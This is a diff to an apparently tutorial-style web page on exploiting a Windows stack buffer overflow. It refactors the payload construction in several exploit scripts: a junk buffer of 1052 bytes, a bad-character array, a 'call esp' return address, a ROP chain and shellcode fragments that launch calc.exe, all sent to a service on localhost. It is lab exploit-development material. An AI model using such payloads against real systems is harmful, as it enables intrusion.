@@ -338,10 +338,10 @@ Looking for 1jB0 in pattern of 500000 bytes
 offset </span><span class="o">= </span><span class="mi">1052</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
-stack </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">300</span><span class="p">
-
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret </span><span class="o">+ </span><span class="p">stack
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 300</span><span class="p">
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)  
 shell.sendline(payload)</span>
@@ -400,9 +400,7 @@ Binary output saved in C:\mona\bytearray.bin</span>
 offset </span><span class="o">= </span><span class="mi">1052</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
-
-badchars </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+badchars </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
 badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"</span><span class="p">  
 badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"</span><span class="p">  
 badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"</span><span class="p">  
@@ -412,7 +410,10 @@ badchars </span><span class="o">+= </span><span class="no">b</span><span class="
 badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"</span><span class="p">  
 badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret </span><span class="o">+ </span><span class="p">badchars
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> badchars
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)
 shell.sendline(payload)</span>
@@ -572,8 +573,6 @@ shellcode += b"\x63\x2e\x65\x78\x65\x00"</span>
 offset </span><span class="o">= </span><span class="mi">1052</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-callesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x68f7bcdb</span><span class="p">)
-
 shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0</span><span class="s">"</span><span class="p">  
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b</span><span class="s">"</span><span class="p">  
@@ -594,7 +593,10 @@ shellcode </span><span class="o">+=</span><span class="no"> b</span><span class=
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c</span><span class="s">"</span><span class="p">  
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">callesp </span><span class="o">+ </span><span class="p">shellcode
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x68f7bcdb</span><span class="p">) </span><span class="c1"># call esp;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)
 shell.sendline(payload)</span>
@@ -845,7 +847,10 @@ shellcode </span><span class="o">+=</span><span class="no"> b</span><span class=
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c</span><span class="s">"</span><span class="p">  
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">rop </span><span class="o">+ </span><span class="p">shellcode
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> rop
+payload</span><span class="o"> +=</span><span class="p"> shellcode
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)
 shell.sendline(payload)</span>
